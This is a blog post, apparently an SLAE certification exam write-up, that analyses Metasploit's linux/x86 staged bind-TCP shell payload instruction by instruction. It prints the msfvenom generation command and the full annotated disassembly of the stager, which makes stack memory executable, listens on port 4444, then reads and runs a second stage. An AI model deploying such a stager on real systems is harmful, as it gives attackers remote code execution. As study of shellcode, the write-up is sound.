---
title: SLAE Exam 5 Shellcode Analysis - Part 2
category: Security
tags: [slae, shell, assembly, programming]
---

I'm about to make up for some lost time! Today we're moving straight into part two of assignment 5. We'll be following the same basic analysis process, but in this post we'll be looking at the MSF staged-bind-shell payload. I'm looking forward to seeing how this works, because I've used it several times, but never bothered to look deeper. I guess that makes me a bad infosec operator! Anyways, let's dig in!

## Problem Statement

* Take up at least 3 shellcode samples created using Msfpayload for linux/x86
* Use GDB/Ndisasm/Libemu to dissect the functionality of the shellcode
* Present your analysis

As previously mentioned, we're looking at msfvenom's `linux/x86/shell/bind_tcp` payload. If you missed [Part One]({% post_url 2018-03-11-slae-exam-5-shellcode-analysis-part-1 %}), I highly recommend going back and reading that. Once you're all caught up, rejoin us below!

#### Generating the Files

We'll quickly get started by generating our raw and disassembled files.

```bash
root@kali:~/courses/slae/exam/assignment5# msfvenom -p linux/x86/shell/bind_tcp -a x86 --platform linux > staged_bind_shell.raw

root@kali:~/courses/slae/exam/assignment5# ndisasm -b 32 staged_bind_shell.raw > staged_bind_shell_analyzed.nasm
```


## Analysis

Now let's dig through the assembly and see what's really going on. One reference you'll want to have to follow along are these [socketcall numbers](http://jkukunas.blogspot.com/2010/05/x86-linux-networking-system-calls.html) that I came across. Also, full details for any of the functions called can be found on the second man page for each function (eg: man 2 function_name).


#### Declare Memory Region for Future Use

```
00000000      push byte +0x7d           ; push 7d
00000002      pop eax                   ; SYSCALL(125) // man 2 mprotect
00000003      cdq                       ; clear EDX
00000004      mov dl,0x7                ; prot mode, 7 = READ/WRITE/EXEC
00000006      mov ecx,0x1000            ; size of memory will be 0x1000
0000000B      mov ebx,esp               ; pointer to memory will be esp
0000000D      and bx,0xf000             ; align the address in bx to a page (0x1000 is size of a page according to "getconf PAGE_SIZE")
00000012      int 0x80                  ; call mprotect(esp, 0x1000, 7)
```

Here, the payload is going to prepare a section of memory for receiving the shellcode by calling `mprotect`. `mprotect` changes protection for the calling process's memory pages specified in the call. In this case, we are setting the memory protection to 7, which is a bitwise-and of the `PROT_READ`, `PROT_WRITE`, and `PROT_EXEC` values.


#### Make the Socket

```
00000014      xor ebx,ebx               ; Clear EBX
00000016      mul ebx                   ; Clear EAX, EDX
00000018      push ebx                  ; Push argument 0x00000000 (protocol of socket)
00000019      inc ebx                   ; socketcall number for SOCKET (found at /usr/include/linux/net.h)
0000001A      push ebx                  ; Push argument 0x00000001 (type of socket) SOCK_STREAM (see Assignment 1 for details)
0000001B      push byte +0x2            ; Push argument 0x2 (domain of socket) AF_INET (see Assignment 1 for details)
0000001D      mov ecx,esp               ; store pointer to [0x2, 0x00000001, 0x00000000] in ecx
0000001F      mov al,0x66               ; SYSCALL(0x66) // man 2 socketcall
00000021      int 0x80                  ; call socketcall(1, esp) -> socket(2, 1, 0) -> socket(AF_INET, SOCK_STREAM, 0) (see Assignment 1 for details)
```

Obviously, we need a socket to operate on. Socketcall is an interesting function, and I recommend reading the manpage for it in order to fully understand what's happening with it. Basically, the first argument to socketcall will be a number indicating which socket-based function to call, and the second argument will be a pointer to the arguments for that socket-based function. The numbers for the socket-based functions can be found above in the link posted at the beginning of the analysis. The rest of these operations have been covered in previous posts for SLAE, so I will ask that if the comments don't make sense, please review these earlier posts and then come back.


#### Set Socket Options

```
00000023      push ecx                  ; [*(2, 1, 0)] // current top of stack
00000024      push byte +0x4            ; [4, *(2, 1, 0)] // stack
00000026      push esp                  ; [*(4), 4, *(2, 1, 0)] // stack
00000027      push byte +0x2            ; [2, ...] // stack
00000029      push byte +0x1            ; [1, 2, ...] // stack
0000002B      push eax                  ; [SOCKFD, 1, 2, *(4), 4, *(2, 1, 0)] // stack
0000002C      xchg eax,edi              ; mov SOCKFD into edi, edi into eax
0000002D      mov ecx,esp               ; ecx now points to [SOCKFD, 1, 2, *(4), 4, *(2, 1, 0)]
0000002F      push byte +0xe            ; socketcall number for setsockopt
00000031      pop ebx                   ; EBX holds 0xe
00000032      push byte +0x66           ; prepare for syscall to socketcall
00000034      pop eax                   ; SYSCALL(0x66) // man 2 socketcall // used for next line: /usr/include/asm-generic/socket.h
00000035      int 0x80                  ; call socketcall(14, esp) -> setsockopt(SOCKFD, 1, 2, *4, 4) -> setsockopt(SOCKFD, SOL_SOCKET, SO_REUSEADDR, *4, 4)
```

Some extra options were specified for our socket in this section. This whole section sets the `SO_REUSEADDR` option on our socket. This option allows our program to bind to an address which is in a TIME_WAIT state. So, if our shellcode died for some reason, but launched again 10 seconds later, if we didn't set this option, the bind call would fail because the IP/PORT combo would be in a TIME_WAIT state. With this option, we can re-bind immediately if something bad happens.


#### Bind Socket

```
00000037      xchg eax,edi              ; restore SOCKFD into eax
00000038      add esp,byte +0x14        ; remove 0x14 (20) bytes from the stack
0000003B      pop ecx                   ; [*(2, 1, 0)]
0000003C      pop ebx                   ; 0x0000002 // man 2 bind
0000003D      pop esi                   ; 0x0000001 //
0000003E      push edx                  ; [0]
0000003F      push dword 0x5c110002     ; [0x5c110002, 0]
00000044      push byte +0x10           ; [0x10, 0x5c110002, 0]
00000046      push ecx                  ; [*(0x5c110002, 0), 0x10, 0x5c110002, 0]
00000047      push eax                  ; [SOCKFD, *(0x5c110002, 0), 0x10, 0x5c110002, 0]
00000048      mov ecx,esp               ; ecx now points to [SOCKFD, *(0x5c110002, 0), 0x10, 0x5c110002, 0]
0000004A      push byte +0x66           ; prepare for syscall to socketcall
0000004C      pop eax                   ; SYSCALL(0x66) // man 2 socketcall
0000004D      int 0x80                  ; call socketcall(2, esp) -> bind(SOCKFD, *sockaddr, sockaddr_len) -> bind(SOCKFD, {sin_family: 0x0002, sin_port: 0x115c (4444), sin_addr.s_addr: 0x00000000}, 0x10)
```

This section is pretty straightforward. We bind our socket to `0.0.0.0:4444`. Review comments for the details on each instruction.


#### Listen for Connections

```
0000004F      shl ebx,1                 ; shift 2 left once, resulting in 4 // man 2 listen
00000051      mov al,0x66               ; SYSCALL(0x66) // man 2 socketcall
00000053      int 0x80                  ; call socketcall(4, esp) -> listen(SOCKFD, &ecx) // the address of ecx is just the backlog int, no worries
```

Again, this section is very simple. We are just marking the socket as a passive socket that will be used to accept incoming connection requests using `accept`.


#### Accept Connections
```
00000055      push eax                  ; push return value of 0
00000056      inc ebx                   ; inc ebx to 5 // man 2 accept
00000057      mov al,0x66               ; SYSCALL(0x66) // man 2 socketcall
00000059      mov [ecx+0x4],edx         ; ecx is now pointing to [SOCKFD, 0x00000000, 0x10] // we don't care about sockaddr returning to us
0000005C      int 0x80                  ; call socketcall(5, ecx) -> accept(SOCKFD, NULL, 0x00000010)
```

Yet another simple section, where we instruct our socket to extract the first connection request on the queue of pending connections and return the file descriptor of a newly created socket for that connection.


#### Read From New Connection

```
0000005E      xchg eax,ebx              ; move returned NEWFD into ebx, SOCKFD into eax
0000005F      mov dh,0xc                ; edx now 0x00000c00
00000061      mov al,0x3                ; SYSCALL(3) // man read
00000063      int 0x80                  ; read(NEWFD, ECX, 0xC00)
```

Since this is a staged connection, we will read 0xc00 bytes from our new connection, and store the received data onto the stack.


#### Close STDIN

```
00000065      xchg ebx,edi              ; store NEWFD in edi
00000067      pop ebx                   ; pop 0x00000000 into ebx
00000068      mov al,0x6                ; SYSCALL(6) // man 2 close
0000006A      int 0x80                  ; close(0) // close stdin
```

This was an interesting section. All it's doing is closing STDIN, but why? Apparently, this is wise to do so that no data from STDIN can interefere with the shell. Cool find!


#### Jump to the Staged Shellcode

```
0000006C      jmp ecx                   ; jump to data received from NEWFD (staged payload)
```

ECX is still pointing to the staged shellcode. So, we are simply passing execution to that newly received shellcode in this final section!


## Wrapping Up

The `linux/x86/shell/bind_tcp` payload was a very cool payload to dissect. I learned a lot about the `socketcall` function, as well as how to read data onto the stack and mark the section of code as readable, writable, and executable. Overall, I had a great time doing this assignment and I can't wait to move on to the commonly used reverse tcp shell! Until then, keep grinding!


###### SLAE Exam Statement

This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:

http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/

Student ID: SLAE-1158
